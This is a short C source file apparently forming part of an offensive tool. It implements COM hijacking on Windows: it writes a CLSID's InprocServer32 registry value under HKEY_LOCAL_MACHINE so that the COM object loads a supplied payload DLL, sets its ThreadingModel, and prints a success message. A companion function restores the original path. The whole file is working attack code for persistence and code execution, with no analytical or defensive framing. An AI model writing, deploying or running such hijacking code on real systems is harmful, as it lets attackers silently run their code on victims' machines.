#include "com_hijack_config.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

int HijackCOMCLSID(const char* clsid, const char* payloadPath) {
	char regKey[MAX_PATH];
	snprintf(regKey, sizeof(regKey), COM_HIJACK_KEY, clsid);

	HKEY hKey;
	LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, regKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
	if (result != ERROR_SUCCESS) {
		printf("Failed to create registry key: %ld\n", result);
		return 0;
	}

	// Set the payload path as the InprocServer32 value
	result = RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)payloadPath, strlen(payloadPath) + 1);
	if (result != ERROR_SUCCESS) {
		printf("Failed to set registry value: %ld\n", result);
		RegCloseKey(hKey);
		return 0;
	}

	// Set ThreadingModel to Apartment (required for most COM objects)
	const char* threadingModel = "Apartment";
	result = RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)threadingModel, strlen(threadingModel) + 1);
	if (result != ERROR_SUCCESS) {
		printf("Failed to set ThreadingModel: %ld\n", result);
		RegCloseKey(hKey);
		return 0;
	}

	RegCloseKey(hKey);
	printf("Successfully hijacked CLSID: %s\n", clsid);
	return 1;
}

int RestoreCOMCLSID(const char* clsid, const char* originalPath) {
	return HijackCOMCLSID(clsid, originalPath);
}